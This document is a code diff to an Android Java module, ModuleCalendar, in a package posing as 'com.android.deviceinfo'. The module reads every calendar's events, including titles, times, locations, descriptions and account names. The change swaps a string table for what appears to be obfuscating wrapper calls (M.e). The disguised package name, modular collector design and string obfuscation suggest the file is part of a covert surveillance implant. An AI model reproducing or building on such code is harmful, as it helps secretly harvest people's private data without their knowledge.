@@ -2,19 +2,15 @@ package com.android.deviceinfo.module;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
-import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
-import java.util.HashSet;
 import java.util.Hashtable;
-import java.util.List;
 
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.ProcessInfo;
 import com.android.deviceinfo.ProcessStatus;
 import com.android.deviceinfo.Status;
@@ -30,8 +26,8 @@ import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
-import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> {
 
@@ -174,7 +170,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 		String contentProvider;
 
 		// d_19=content://com.android.calendar
-		contentProvider = Messages.getString("d_19"); //$NON-NLS-1$
+		contentProvider = M.e("content://com.android.calendar"); //$NON-NLS-1$
 		calendars = selectCalendars(contentProvider);
 
 		if (calendars == null || calendars.isEmpty()) {
@@ -182,7 +178,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 				Check.log(TAG + " (calendar): opening 2.2 style"); //$NON-NLS-1$
 			}
 			// d_18=content://calendar
-			contentProvider = Messages.getString("d_18"); //$NON-NLS-1$
+			contentProvider = M.e("content://calendar"); //$NON-NLS-1$
 			calendars = selectCalendars(contentProvider);
 		} else {
 			if (Cfg.DEBUG) {
@@ -199,7 +195,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (calendar): " + calendar_id); //$NON-NLS-1$
 			}
-			Uri.Builder builder = Uri.parse(contentProvider + Messages.getString("d_17")).buildUpon(); //$NON-NLS-1$
+			Uri.Builder builder = Uri.parse(contentProvider + M.e("/events")).buildUpon(); //$NON-NLS-1$
 			String textUri = builder.build().toString();
 
 			// d_7=_id
@@ -215,8 +211,8 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 			Cursor eventCursor = managedQuery(
 					builder.build(),
 					new String[] {
-							Messages.getString("d_7"), Messages.getString("d_8"), Messages.getString("d_9"), Messages.getString("d_10"), //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
-							Messages.getString("d_11"), Messages.getString("d_12"), Messages.getString("d_13"), Messages.getString("d_14") }, Messages.getString("d_15") + "=" + id, null, Messages.getString("d_16")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
+							M.e("_id"), M.e("title"), M.e("dtstart"), M.e("dtend"), //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+							M.e("rrule"), M.e("allDay"), M.e("eventLocation"), M.e("description") }, M.e("calendar_id") + "=" + id, null, M.e("_id ASC")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
 
 			while (eventCursor.moveToNext()) {
 				int index = 0;
@@ -290,9 +286,9 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 			}
 
 			String[] projection = new String[] {
-					Messages.getString("d_3"), "account_name", "calendar_displayName", "ownerAccount" }; //$NON-NLS-1$
+					M.e("_id"), "account_name", "calendar_displayName", "ownerAccount" }; //$NON-NLS-1$
 			// Uri calendars = Uri.parse("content://calendar/calendars");
-			Uri calendars = Uri.parse(contentProvider + Messages.getString("d_2")); //$NON-NLS-1$
+			Uri calendars = Uri.parse(contentProvider + M.e("/calendars")); //$NON-NLS-1$
 			Hashtable<String, String> calendarIds = new Hashtable<String, String>();
 			Cursor managedCursor = managedQuery(calendars, projection, null, null, null); //$NON-NLS-1$
 
@@ -386,9 +382,9 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 
 			if (rrule != null) {
 				if (description == null) {
-					description = Messages.getString("d_0") + rrule; //$NON-NLS-1$
+					description = M.e("RULE: ") + rrule; //$NON-NLS-1$
 				} else {
-					description += " \n" + Messages.getString("d_0") + rrule; //$NON-NLS-1$
+					description += " \n" + M.e("RULE: ") + rrule; //$NON-NLS-1$
 				}
 			}
 
